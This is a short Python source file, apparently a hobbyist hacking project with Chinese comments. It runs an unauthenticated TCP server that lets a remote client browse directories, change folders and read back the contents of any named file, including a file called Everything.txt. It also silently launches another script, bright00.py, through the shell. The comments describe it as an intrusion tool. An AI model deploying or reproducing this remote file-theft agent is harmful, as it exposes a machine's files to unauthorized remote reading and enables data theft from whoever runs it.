#! python3
# -*-coding:utf-8 -*-
#向所有愚蠢的规则与秩序高举反叛之旗！

#你以为我是被攻击方！其实我是dio哒！（划掉）其实我是服务器哒！
from socket import *
import os,sys
import threading
from time import ctime,sleep
import subprocess
 
lt=''
i=0
length=''
llen=''
try2hack=''
confirm=''	#是否确认登录
foldername=''

address='10.209.0.172'
port=12345



def newrecc(csock,lt,n):
	while len(lt.encode())<n:					#这样才兼容中文字符！
		k=''
		k=csock.recv(n-len(lt)).decode('utf-8')
		print("k=%s"%k)
		lt+=k
#		print("lt=%s"%lt)
	return lt

def findsprit(pathnow):					#获取上级目录路径
	i=0
	position=0
	spritnum=0
	for i in range(len(pathnow)):
		if pathnow[i]=='\\':
			position=i
			spritnum+=1
		else:
			continue
	if spritnum==1:
		return pathnow[0:position+1]
	else:
		return pathnow[0:position]	

def hacktime(csocket,caddress):
	global length,lt,llen,try2hack,confirm,foldername
	i=0
	print("检测到入侵！！诶？我不就是来入侵的么")			

	lt=newrecc(csocket,lt,1)						#传输内容
	print('lt=%s'%lt)
#	subprocess.Popen('bright00.py',shell=True)
	if lt=='1':
		pathnow=os.getcwd()
		print(type(pathnow))
		print("OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO")
		csocket.send(str(len(str(len(pathnow.encode())))).encode())
		csocket.send(str(len(pathnow.encode())).encode())
		csocket.send(pathnow.encode())
		print("I'm here!!!!!!!!!!!!!!!!!")
		'''
		ft=os.open('temp00.txt',os.O_RDWR|os.O_CREAT)
		os.write(ft,'shit!'.encode())
		os.close(ft)
		os.chdir(r'E:/NewHome')
		pathnow=os.getcwd()
		'''
		while try2hack!='0':
			try2hack=newrecc(csocket,try2hack,1)
	#		print("try2hack=%s"%try2hack)
			if try2hack=='1':
				pathnow=os.getcwd()
				filelist=os.listdir(pathnow)
				filenum=len(filelist)
				print(filenum)
				print(type(filenum))
		#		print(filelist)
				print(str(len(str(filenum))))
				csocket.send(str(len(str(filenum))).encode())
				csocket.send(str(filenum).encode())		#传输当前目录文件数
				for i in range(len(filelist)):
					print(filelist[i])
					csocket.send(str(len(str(len(filelist[i].encode())))).encode())
					csocket.send(str(len(filelist[i].encode())).encode())
					csocket.send(filelist[i].encode())
				print("传输完成")
				try2hack=''
			elif try2hack=='2':
				confirm=''
				confirm=newrecc(csocket,confirm,1)
				print('confirm=%s'%confirm)
				if confirm=='Y':
					llen=''
					length=''
					llen=newrecc(csocket,llen,1)
					length=newrecc(csocket,length,int(llen))
					foldername=''
					foldername=newrecc(csocket,foldername,int(length))
					pathnow=os.getcwd()
					os.chdir(pathnow+'\\'+foldername)
					pathnow=os.getcwd()
					print(pathnow)
					csocket.send(str(len(str(len(pathnow.encode())))).encode())
					csocket.send(str(len(pathnow.encode())).encode())
					csocket.send(pathnow.encode())
				try2hack=''
			elif try2hack=='3':
				confirm=''
				confirm=newrecc(csocket,confirm,1)
				if confirm=='Y':
					txtname=''
					llen=''
					length=''
					llen=newrecc(csocket,llen,1)
					length=newrecc(csocket,length,int(llen))
					txtname=newrecc(csocket,txtname,int(length))
					fwanted=open(txtname,'r')
					txtdata=fwanted.read()
					csocket.send(str(len(str(len(txtdata.encode())))).encode())
					csocket.send(str(len(txtdata.encode())).encode())
					csocket.send(txtdata.encode())
				try2hack=''
			elif try2hack=='4':
				pathto=''
				pathnow=os.getcwd()
				pathto=findsprit(pathnow)
				os.chdir(pathto)
				pathnow=os.getcwd()
				print(pathnow)
				csocket.send(str(len(str(len(pathnow.encode())))).encode())
				csocket.send(str(len(pathnow.encode())).encode())
				csocket.send(pathnow.encode())
				try2hack=''
			else:
				pass
		print('Here we are in',pathnow)
		
	elif lt=='2':
		pathnow=os.getcwd()
		ftogive=open(pathnow+'\\Everything.txt','r')
		datatogive=ftogive.read()
		csocket.send(str(len(str(len(datatogive)))).encode())
		csocket.send(str(len(datatogive)).encode())
		csocket.send(datatogive.encode())
	elif lt=='0':
		csocket.close()
	csocket.close()

def waitingforking():
	while True:
		print("I'm running!")
		sleep(1)


s=socket(AF_INET,SOCK_STREAM)
s.bind((address,port))
s.listen(1)

t1=threading.Thread(target=waitingforking)
t1.start()
subprocess.Popen('bright00.py',shell=True)

while True:
	csocket,caddress=s.accept()
	t2=threading.Thread(target=hacktime,args=(csocket,caddress))
	t2.start()
	s.close()	
	exit(0)
